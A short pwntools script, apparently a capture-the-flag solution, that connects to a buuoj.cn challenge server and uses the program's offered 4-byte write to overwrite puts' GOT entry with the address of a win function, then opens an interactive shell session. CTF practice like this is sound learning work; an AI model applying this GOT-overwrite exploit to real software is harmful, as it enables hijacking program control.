from pwn import *

io = remote("node4.buuoj.cn", 29996)

puts_got = 0x804A00C
win = 0x804854B

io.recvuntil("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?\n")
io.sendline(hex(puts_got))

io.recvuntil("Okay, now what value would you like to write to 0x804a00c\n")
io.sendline(hex(win))

io.interactive()